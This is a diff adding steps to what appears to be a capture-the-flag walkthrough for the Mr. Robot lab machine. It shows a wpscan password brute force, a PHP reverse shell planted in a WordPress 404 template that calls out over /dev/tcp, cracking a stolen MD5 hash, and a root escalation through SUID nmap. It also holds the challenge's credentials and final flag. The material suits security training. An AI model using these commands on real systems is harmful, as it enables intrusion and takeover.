@@ -412,10 +412,71 @@ we found two file: dic and key
 
 6 -  wpscan -t 10000 -U Elliot -P fsocity.dic --url http://192.168.43.237
 
-7 - 
+[SUCCESS] - Elliot / ER28-0652  
 
 
+7 - nc -nvlp 443
 
+
+in Twenty Fifteen: 404 Template (404.php) page editor:
+
+add: 
+
+<?php 
+exec("/bin/bash -c 'bash -i &> /dev/tcp/192.168.43.214/443 0>&1'");
+?>
+
+in first line before <?php
+/**
+ * The template for displaying 404 pages (not found)
+ *
+.........
+
+8 - 
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cd /home/robot
+
+daemon@linux:/home/robot$ cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs$  python3 -c 'import pty;pty.spawn("/bin/sh")'
+
+
+9 - in https://crackstation.net/ we cracked our hash:   abcdefghijklmnopqrstuvwxyz
+robot@linux:~$ 
+
+For this box, the strategy that worked was to locate an executable with suid bit enabled and use it run root-level commands:
+
+( permission set as 4000)
+robot@linux:~$ find / -perm  /4000 -type f 2>/dev/null
+find / -perm  /4000 -type f 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+
+10 - 
+robot@linux:~$ nmap --interactive
+
+nmap> !sh
+
+# id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot) 
+# cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+
+DONE!
 #######################################################################################################################################################
 
 KB-VULN2 walkthrough
